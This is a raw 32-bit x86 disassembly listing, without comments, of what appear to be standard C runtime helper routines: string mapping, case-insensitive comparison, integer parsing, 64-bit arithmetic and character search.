  426baf:	cmp    DWORD PTR [ebp-0x2c],edi
  426bb2:	jne    0x426bce
  426bb4:	push   edi
  426bb5:	push   edi
  426bb6:	push   ebx
  426bb7:	push   DWORD PTR [ebp+0x10]
  426bba:	push   0x1
  426bbc:	push   DWORD PTR [ebp+0x8]
  426bbf:	call   DWORD PTR ds:0x4280cc
  426bc5:	mov    esi,eax
  426bc7:	mov    DWORD PTR [ebp-0x44],esi
  426bca:	cmp    esi,edi
  426bcc:	je     0x426c26
  426bce:	mov    DWORD PTR [ebp-0x4],edi
  426bd1:	lea    eax,[esi+esi*1]
  426bd4:	add    eax,0x3
  426bd7:	and    eax,0xfffffffc
  426bda:	call   0x4238b0
  426bdf:	mov    DWORD PTR [ebp-0x18],esp
  426be2:	mov    ebx,esp
  426be4:	mov    DWORD PTR [ebp-0x48],ebx
  426be7:	lea    eax,[esi+esi*1]
  426bea:	push   eax
  426beb:	push   edi
  426bec:	push   ebx
  426bed:	call   0x426160
  426bf2:	add    esp,0xc
  426bf5:	or     DWORD PTR [ebp-0x4],0xffffffff
  426bf9:	jmp    0x426c12
  426bfb:	xor    eax,eax
  426bfd:	inc    eax
  426bfe:	ret    
  426bff:	mov    esp,DWORD PTR [ebp-0x18]
  426c02:	call   0x426cf5
  426c07:	xor    edi,edi
  426c09:	xor    ebx,ebx
  426c0b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c0f:	mov    esi,DWORD PTR [ebp-0x44]
  426c12:	cmp    ebx,edi
  426c14:	jne    0x426c34
  426c16:	push   esi
  426c17:	push   0x2
  426c19:	call   0x424978
  426c1e:	pop    ecx
  426c1f:	pop    ecx
  426c20:	mov    ebx,eax
  426c22:	cmp    ebx,edi
  426c24:	jne    0x426c2d
  426c26:	xor    eax,eax
  426c28:	jmp    0x426ce1
  426c2d:	mov    DWORD PTR [ebp-0x24],0x1
  426c34:	push   esi
  426c35:	push   ebx
  426c36:	push   DWORD PTR [ebp-0x28]
  426c39:	push   DWORD PTR [ebp+0x10]
  426c3c:	push   0x1
  426c3e:	push   DWORD PTR [ebp+0x8]
  426c41:	call   DWORD PTR ds:0x4280cc
  426c47:	test   eax,eax
  426c49:	je     0x426cd2
  426c4f:	cmp    DWORD PTR [ebp+0x18],edi
  426c52:	je     0x426c74
  426c54:	push   edi
  426c55:	push   edi
  426c56:	push   DWORD PTR [ebp+0x1c]
  426c59:	push   DWORD PTR [ebp+0x18]
  426c5c:	push   esi
  426c5d:	push   ebx
  426c5e:	push   edi
  426c5f:	push   DWORD PTR [ebp+0xc]
  426c62:	call   DWORD PTR ds:0x428050
  426c68:	test   eax,eax
  426c6a:	je     0x426cd2
  426c6c:	mov    eax,DWORD PTR [ebp+0x18]
  426c6f:	mov    DWORD PTR [ebp-0x20],eax
  426c72:	jmp    0x426cd2
  426c74:	cmp    DWORD PTR [ebp-0x2c],edi
  426c77:	jne    0x426c8f
  426c79:	push   edi
  426c7a:	push   edi
  426c7b:	push   edi
  426c7c:	push   edi
  426c7d:	push   esi
  426c7e:	push   ebx
  426c7f:	push   edi
  426c80:	push   DWORD PTR [ebp+0xc]
  426c83:	call   DWORD PTR ds:0x428050
  426c89:	mov    esi,eax
  426c8b:	cmp    esi,edi
  426c8d:	je     0x426cd2
  426c8f:	push   esi
  426c90:	push   0x1
  426c92:	call   0x424978
  426c97:	pop    ecx
  426c98:	pop    ecx
  426c99:	mov    DWORD PTR [ebp-0x20],eax
  426c9c:	cmp    eax,edi
  426c9e:	je     0x426cd2
  426ca0:	push   edi
  426ca1:	push   edi
  426ca2:	push   esi
  426ca3:	push   eax
  426ca4:	push   esi
  426ca5:	push   ebx
  426ca6:	push   edi
  426ca7:	push   DWORD PTR [ebp+0xc]
  426caa:	call   DWORD PTR ds:0x428050
  426cb0:	cmp    eax,edi
  426cb2:	jne    0x426cc2
  426cb4:	push   DWORD PTR [ebp-0x20]
  426cb7:	call   0x42446a
  426cbc:	pop    ecx
  426cbd:	mov    DWORD PTR [ebp-0x20],edi
  426cc0:	jmp    0x426cd2
  426cc2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426cc6:	je     0x426cd2
  426cc8:	mov    ecx,DWORD PTR [ebp+0x14]
  426ccb:	mov    DWORD PTR [ecx],eax
  426ccd:	jmp    0x426cd2
  426ccf:	mov    ebx,DWORD PTR [ebp-0x48]
  426cd2:	cmp    DWORD PTR [ebp-0x24],edi
  426cd5:	je     0x426cde
  426cd7:	push   ebx
  426cd8:	call   0x42446a
  426cdd:	pop    ecx
  426cde:	mov    eax,DWORD PTR [ebp-0x20]
  426ce1:	lea    esp,[ebp-0x54]
  426ce4:	mov    ecx,DWORD PTR [ebp-0x1c]
  426ce7:	xor    ecx,DWORD PTR [ebp+0x4]
  426cea:	call   0x423f2c
  426cef:	call   0x423893
  426cf4:	ret    
  426cf5:	push   ebp
  426cf6:	mov    ebp,esp
  426cf8:	sub    esp,0x48
  426cfb:	push   ebx
  426cfc:	push   esi
  426cfd:	push   edi
  426cfe:	push   0x4
  426d00:	pop    eax
  426d01:	call   0x4238b0
  426d06:	mov    ebx,esp
  426d08:	push   0x1c
  426d0a:	lea    eax,[ebp-0x24]
  426d0d:	push   eax
  426d0e:	push   ebx
  426d0f:	call   DWORD PTR ds:0x4280e8
  426d15:	test   eax,eax
  426d17:	je     0x426d8a
  426d19:	mov    edi,DWORD PTR [ebp-0x20]
  426d1c:	lea    eax,[ebp-0x48]
  426d1f:	push   eax
  426d20:	call   DWORD PTR ds:0x4280e4
  426d26:	mov    eax,DWORD PTR [ebp-0x44]
  426d29:	lea    esi,[eax-0x1]
  426d2c:	not    esi
  426d2e:	and    esi,ebx
  426d30:	sub    esi,eax
  426d32:	mov    DWORD PTR [ebp-0x4],eax
  426d35:	mov    eax,ds:0x45cac4
  426d3a:	mov    ecx,eax
  426d3c:	dec    ecx
  426d3d:	neg    ecx
  426d3f:	sbb    ecx,ecx
  426d41:	and    ecx,0xffff1000
  426d47:	add    ecx,0x11000
  426d4d:	add    ecx,edi
  426d4f:	cmp    esi,ecx
  426d51:	jb     0x426d8a
  426d53:	cmp    eax,0x1
  426d56:	je     0x426da2
  426d58:	mov    ebx,edi
  426d5a:	mov    edi,0x1000
  426d5f:	push   0x1c
  426d61:	lea    eax,[ebp-0x24]
  426d64:	push   eax
  426d65:	push   ebx
  426d66:	call   DWORD PTR ds:0x4280e8
  426d6c:	test   eax,eax
  426d6e:	je     0x426d8a
  426d70:	add    ebx,DWORD PTR [ebp-0x18]
  426d73:	test   DWORD PTR [ebp-0x14],edi
  426d76:	je     0x426d5f
  426d78:	test   BYTE PTR [ebp-0xf],0x1
  426d7c:	mov    ebx,DWORD PTR [ebp-0x24]
  426d7f:	je     0x426d86
  426d81:	xor    eax,eax
  426d83:	inc    eax
  426d84:	jmp    0x426dbe
  426d86:	cmp    esi,ebx
  426d88:	jae    0x426d8e
  426d8a:	xor    eax,eax
  426d8c:	jmp    0x426dbe
  426d8e:	push   0x4
  426d90:	push   edi
  426d91:	push   DWORD PTR [ebp-0x4]
  426d94:	push   ebx
  426d95:	call   DWORD PTR ds:0x4280ac
  426d9b:	mov    eax,ds:0x45cac4
  426da0:	jmp    0x426da4
  426da2:	mov    ebx,esi
  426da4:	dec    eax
  426da5:	neg    eax
  426da7:	sbb    eax,eax
  426da9:	and    eax,0x103
  426dae:	lea    ecx,[ebp-0x8]
  426db1:	push   ecx
  426db2:	inc    eax
  426db3:	push   eax
  426db4:	push   DWORD PTR [ebp-0x4]
  426db7:	push   ebx
  426db8:	call   DWORD PTR ds:0x428008
  426dbe:	lea    esp,[ebp-0x54]
  426dc1:	pop    edi
  426dc2:	pop    esi
  426dc3:	pop    ebx
  426dc4:	leave  
  426dc5:	ret    
  426dc6:	int3   
  426dc7:	int3   
  426dc8:	int3   
  426dc9:	int3   
  426dca:	int3   
  426dcb:	int3   
  426dcc:	int3   
  426dcd:	int3   
  426dce:	int3   
  426dcf:	int3   
  426dd0:	push   ebp
  426dd1:	mov    ebp,esp
  426dd3:	push   edi
  426dd4:	push   esi
  426dd5:	push   ebx
  426dd6:	mov    esi,DWORD PTR [ebp+0xc]
  426dd9:	mov    edi,DWORD PTR [ebp+0x8]
  426ddc:	mov    al,0xff
  426dde:	mov    edi,edi
  426de0:	or     al,al
  426de2:	je     0x426e16
  426de4:	mov    al,BYTE PTR [esi]
  426de6:	add    esi,0x1
  426de9:	mov    ah,BYTE PTR [edi]
  426deb:	add    edi,0x1
  426dee:	cmp    ah,al
  426df0:	je     0x426de0
  426df2:	sub    al,0x41
  426df4:	cmp    al,0x1a
  426df6:	sbb    cl,cl
  426df8:	and    cl,0x20
  426dfb:	add    al,cl
  426dfd:	add    al,0x41
  426dff:	xchg   al,ah
  426e01:	sub    al,0x41
  426e03:	cmp    al,0x1a
  426e05:	sbb    cl,cl
  426e07:	and    cl,0x20
  426e0a:	add    al,cl
  426e0c:	add    al,0x41
  426e0e:	cmp    al,ah
  426e10:	je     0x426de0
  426e12:	sbb    al,al
  426e14:	sbb    al,0xff
  426e16:	movsx  eax,al
  426e19:	pop    ebx
  426e1a:	pop    esi
  426e1b:	pop    edi
  426e1c:	leave  
  426e1d:	ret    
  426e1e:	push   esi
  426e1f:	push   edi
  426e20:	call   0x42370d
  426e25:	mov    edi,DWORD PTR [eax+0x64]
  426e28:	cmp    edi,DWORD PTR ds:0x45c58c
  426e2e:	je     0x426e37
  426e30:	call   0x424bbf
  426e35:	mov    edi,eax
  426e37:	mov    esi,DWORD PTR [esp+0xc]
  426e3b:	cmp    DWORD PTR [edi+0x28],0x1
  426e3f:	movzx  eax,BYTE PTR [esi]
  426e42:	jle    0x426e52
  426e44:	push   0x8
  426e46:	push   eax
  426e47:	push   edi
  426e48:	call   0x426ea6
  426e4d:	add    esp,0xc
  426e50:	jmp    0x426e5c
  426e52:	mov    ecx,DWORD PTR [edi+0x48]
  426e55:	movzx  eax,BYTE PTR [ecx+eax*2]
  426e59:	and    eax,0x8
  426e5c:	test   eax,eax
  426e5e:	je     0x426e63
  426e60:	inc    esi
  426e61:	jmp    0x426e3b
  426e63:	movzx  ecx,BYTE PTR [esi]
  426e66:	inc    esi
  426e67:	cmp    ecx,0x2d
  426e6a:	mov    edx,ecx
  426e6c:	je     0x426e73
  426e6e:	cmp    ecx,0x2b
  426e71:	jne    0x426e77
  426e73:	movzx  ecx,BYTE PTR [esi]
  426e76:	inc    esi
  426e77:	xor    eax,eax
  426e79:	cmp    ecx,0x30
  426e7c:	jl     0x426e88
  426e7e:	cmp    ecx,0x39
  426e81:	jg     0x426e88
  426e83:	sub    ecx,0x30
  426e86:	jmp    0x426e8b
  426e88:	or     ecx,0xffffffff
  426e8b:	cmp    ecx,0xffffffff
  426e8e:	je     0x426e9c
  426e90:	lea    eax,[eax+eax*4]
  426e93:	lea    eax,[ecx+eax*2]
  426e96:	movzx  ecx,BYTE PTR [esi]
  426e99:	inc    esi
  426e9a:	jmp    0x426e79
  426e9c:	cmp    edx,0x2d
  426e9f:	pop    edi
  426ea0:	pop    esi
  426ea1:	jne    0x426ea5
  426ea3:	neg    eax
  426ea5:	ret    
  426ea6:	push   ebp
  426ea7:	mov    ebp,esp
  426ea9:	push   ecx
  426eaa:	mov    eax,DWORD PTR [ebp+0xc]
  426ead:	lea    ecx,[eax+0x1]
  426eb0:	cmp    ecx,0x100
  426eb6:	mov    ecx,DWORD PTR [ebp+0x8]
  426eb9:	ja     0x426ec4
  426ebb:	mov    ecx,DWORD PTR [ecx+0x48]
  426ebe:	movzx  eax,WORD PTR [ecx+eax*2]
  426ec2:	jmp    0x426f18
  426ec4:	push   esi
  426ec5:	mov    edx,eax
  426ec7:	sar    edx,0x8
  426eca:	push   edi
  426ecb:	mov    edi,DWORD PTR [ecx+0x48]
  426ece:	movzx  esi,dl
  426ed1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426ed6:	pop    edi
  426ed7:	pop    esi
  426ed8:	je     0x426ee9
  426eda:	and    BYTE PTR [ebp-0x2],0x0
  426ede:	push   0x2
  426ee0:	mov    BYTE PTR [ebp-0x3],al
  426ee3:	mov    BYTE PTR [ebp-0x4],dl
  426ee6:	pop    eax
  426ee7:	jmp    0x426ef3
  426ee9:	and    BYTE PTR [ebp-0x3],0x0
  426eed:	mov    BYTE PTR [ebp-0x4],al
  426ef0:	xor    eax,eax
  426ef2:	inc    eax
  426ef3:	push   0x1
  426ef5:	push   DWORD PTR [ecx+0x14]
  426ef8:	push   DWORD PTR [ecx+0x4]
  426efb:	lea    ecx,[ebp+0xe]
  426efe:	push   ecx
  426eff:	push   eax
  426f00:	lea    eax,[ebp-0x4]
  426f03:	push   eax
  426f04:	push   0x1
  426f06:	call   0x425f88
  426f0b:	add    esp,0x1c
  426f0e:	test   eax,eax
  426f10:	jne    0x426f14
  426f12:	leave  
  426f13:	ret    
  426f14:	movzx  eax,WORD PTR [ebp+0xe]
  426f18:	and    eax,DWORD PTR [ebp+0x10]
  426f1b:	leave  
  426f1c:	ret    
  426f1d:	int3   
  426f1e:	int3   
  426f1f:	int3   
  426f20:	mov    eax,DWORD PTR [esp+0x8]
  426f24:	mov    ecx,DWORD PTR [esp+0x10]
  426f28:	or     ecx,eax
  426f2a:	mov    ecx,DWORD PTR [esp+0xc]
  426f2e:	jne    0x426f39
  426f30:	mov    eax,DWORD PTR [esp+0x4]
  426f34:	mul    ecx
  426f36:	ret    0x10
  426f39:	push   ebx
  426f3a:	mul    ecx
  426f3c:	mov    ebx,eax
  426f3e:	mov    eax,DWORD PTR [esp+0x8]
  426f42:	mul    DWORD PTR [esp+0x14]
  426f46:	add    ebx,eax
  426f48:	mov    eax,DWORD PTR [esp+0x8]
  426f4c:	mul    ecx
  426f4e:	add    edx,ebx
  426f50:	pop    ebx
  426f51:	ret    0x10
  426f54:	int3   
  426f55:	int3   
  426f56:	int3   
  426f57:	int3   
  426f58:	int3   
  426f59:	int3   
  426f5a:	int3   
  426f5b:	int3   
  426f5c:	int3   
  426f5d:	int3   
  426f5e:	int3   
  426f5f:	int3   
  426f60:	push   ebp
  426f61:	mov    ebp,esp
  426f63:	push   edi
  426f64:	push   esi
  426f65:	push   ebx
  426f66:	mov    ecx,DWORD PTR [ebp+0x10]
  426f69:	or     ecx,ecx
  426f6b:	je     0x426fba
  426f6d:	mov    esi,DWORD PTR [ebp+0x8]
  426f70:	mov    edi,DWORD PTR [ebp+0xc]
  426f73:	mov    bh,0x41
  426f75:	mov    bl,0x5a
  426f77:	mov    dh,0x20
  426f79:	lea    ecx,[ecx+0x0]
  426f7c:	mov    ah,BYTE PTR [esi]
  426f7e:	or     ah,ah
  426f80:	mov    al,BYTE PTR [edi]
  426f82:	je     0x426fab
  426f84:	or     al,al
  426f86:	je     0x426fab
  426f88:	add    esi,0x1
  426f8b:	add    edi,0x1
  426f8e:	cmp    ah,bh
  426f90:	jb     0x426f98
  426f92:	cmp    ah,bl
  426f94:	ja     0x426f98
  426f96:	add    ah,dh
  426f98:	cmp    al,bh
  426f9a:	jb     0x426fa2
  426f9c:	cmp    al,bl
  426f9e:	ja     0x426fa2
  426fa0:	add    al,dh
  426fa2:	cmp    ah,al
  426fa4:	jne    0x426fb1
  426fa6:	sub    ecx,0x1
  426fa9:	jne    0x426f7c
  426fab:	xor    ecx,ecx
  426fad:	cmp    ah,al
  426faf:	je     0x426fba
  426fb1:	mov    ecx,0xffffffff
  426fb6:	jb     0x426fba
  426fb8:	neg    ecx
  426fba:	mov    eax,ecx
  426fbc:	pop    ebx
  426fbd:	pop    esi
  426fbe:	pop    edi
  426fbf:	leave  
  426fc0:	ret    
  426fc1:	int3   
  426fc2:	int3   
  426fc3:	int3   
  426fc4:	int3   
  426fc5:	int3   
  426fc6:	int3   
  426fc7:	int3   
  426fc8:	int3   
  426fc9:	int3   
  426fca:	int3   
  426fcb:	int3   
  426fcc:	int3   
  426fcd:	int3   
  426fce:	int3   
  426fcf:	int3   
  426fd0:	push   esi
  426fd1:	mov    eax,DWORD PTR [esp+0x14]
  426fd5:	or     eax,eax
  426fd7:	jne    0x427001
  426fd9:	mov    ecx,DWORD PTR [esp+0x10]
  426fdd:	mov    eax,DWORD PTR [esp+0xc]
  426fe1:	xor    edx,edx
  426fe3:	div    ecx
  426fe5:	mov    ebx,eax
  426fe7:	mov    eax,DWORD PTR [esp+0x8]
  426feb:	div    ecx
  426fed:	mov    esi,eax
  426fef:	mov    eax,ebx
  426ff1:	mul    DWORD PTR [esp+0x10]
  426ff5:	mov    ecx,eax
  426ff7:	mov    eax,esi
  426ff9:	mul    DWORD PTR [esp+0x10]
  426ffd:	add    edx,ecx
  426fff:	jmp    0x427048
  427001:	mov    ecx,eax
  427003:	mov    ebx,DWORD PTR [esp+0x10]
  427007:	mov    edx,DWORD PTR [esp+0xc]
  42700b:	mov    eax,DWORD PTR [esp+0x8]
  42700f:	shr    ecx,1
  427011:	rcr    ebx,1
  427013:	shr    edx,1
  427015:	rcr    eax,1
  427017:	or     ecx,ecx
  427019:	jne    0x42700f
  42701b:	div    ebx
  42701d:	mov    esi,eax
  42701f:	mul    DWORD PTR [esp+0x14]
  427023:	mov    ecx,eax
  427025:	mov    eax,DWORD PTR [esp+0x10]
  427029:	mul    esi
  42702b:	add    edx,ecx
  42702d:	jb     0x42703d
  42702f:	cmp    edx,DWORD PTR [esp+0xc]
  427033:	ja     0x42703d
  427035:	jb     0x427046
  427037:	cmp    eax,DWORD PTR [esp+0x8]
  42703b:	jbe    0x427046
  42703d:	dec    esi
  42703e:	sub    eax,DWORD PTR [esp+0x10]
  427042:	sbb    edx,DWORD PTR [esp+0x14]
  427046:	xor    ebx,ebx
  427048:	sub    eax,DWORD PTR [esp+0x8]
  42704c:	sbb    edx,DWORD PTR [esp+0xc]
  427050:	neg    edx
  427052:	neg    eax
  427054:	sbb    edx,0x0
  427057:	mov    ecx,edx
  427059:	mov    edx,ebx
  42705b:	mov    ebx,ecx
  42705d:	mov    ecx,eax
  42705f:	mov    eax,esi
  427061:	pop    esi
  427062:	ret    0x10
  427065:	int3   
  427066:	int3   
  427067:	int3   
  427068:	int3   
  427069:	int3   
  42706a:	int3   
  42706b:	int3   
  42706c:	int3   
  42706d:	int3   
  42706e:	int3   
  42706f:	int3   
  427070:	lea    eax,[edx-0x1]
  427073:	pop    ebx
  427074:	ret    
  427075:	lea    esp,[esp+0x0]
  42707c:	lea    esp,[esp+0x0]
  427080:	xor    eax,eax
  427082:	mov    al,BYTE PTR [esp+0x8]
  427086:	push   ebx
  427087:	mov    ebx,eax
  427089:	shl    eax,0x8
  42708c:	mov    edx,DWORD PTR [esp+0x8]
  427090:	test   edx,0x3
  427096:	je     0x4270ad
  427098:	mov    cl,BYTE PTR [edx]
  42709a:	add    edx,0x1
  42709d:	cmp    cl,bl
  42709f:	je     0x427070
  4270a1:	test   cl,cl
  4270a3:	je     0x4270f6
  4270a5:	test   edx,0x3
  4270ab:	jne    0x427098
  4270ad:	or     ebx,eax
  4270af:	push   edi
  4270b0:	mov    eax,ebx
  4270b2:	shl    ebx,0x10
  4270b5:	push   esi
  4270b6:	or     ebx,eax
  4270b8:	mov    ecx,DWORD PTR [edx]
  4270ba:	mov    edi,0x7efefeff
  4270bf:	mov    eax,ecx
  4270c1:	mov    esi,edi
  4270c3:	xor    ecx,ebx
  4270c5:	add    esi,eax
  4270c7:	add    edi,ecx
  4270c9:	xor    ecx,0xffffffff
  4270cc:	xor    eax,0xffffffff
  4270cf:	xor    ecx,edi
  4270d1:	xor    eax,esi
  4270d3:	add    edx,0x4
  4270d6:	and    ecx,0x81010100
  4270dc:	jne    0x4270fa
  4270de:	and    eax,0x81010100
  4270e3:	je     0x4270b8
  4270e5:	and    eax,0x1010100
  4270ea:	jne    0x4270f4
  4270ec:	and    esi,0x80000000
  4270f2:	jne    0x4270b8
  4270f4:	pop    esi
  4270f5:	pop    edi
  4270f6:	pop    ebx
  4270f7:	xor    eax,eax
  4270f9:	ret    
  4270fa:	mov    eax,DWORD PTR [edx-0x4]
  4270fd:	cmp    al,bl
  4270ff:	je     0x427137
  427101:	test   al,al
  427103:	je     0x4270f4
  427105:	cmp    ah,bl
  427107:	je     0x427130
  427109:	test   ah,ah
  42710b:	je     0x4270f4
  42710d:	shr    eax,0x10
  427110:	cmp    al,bl
  427112:	je     0x427129
  427114:	test   al,al
  427116:	je     0x4270f4
  427118:	cmp    ah,bl
  42711a:	je     0x427122
  42711c:	test   ah,ah
  42711e:	je     0x4270f4
  427120:	jmp    0x4270b8
  427122:	pop    esi
  427123:	pop    edi
  427124:	lea    eax,[edx-0x1]
  427127:	pop    ebx
  427128:	ret    
  427129:	lea    eax,[edx-0x2]
  42712c:	pop    esi
  42712d:	pop    edi
  42712e:	pop    ebx
  42712f:	ret    
  427130:	lea    eax,[edx-0x3]
  427133:	pop    esi
  427134:	pop    edi
  427135:	pop    ebx
  427136:	ret    
  427137:	lea    eax,[edx-0x4]
  42713a:	pop    esi
  42713b:	pop    edi
  42713c:	pop    ebx
  42713d:	ret    
  42713e:	jmp    DWORD PTR ds:0x4280e0
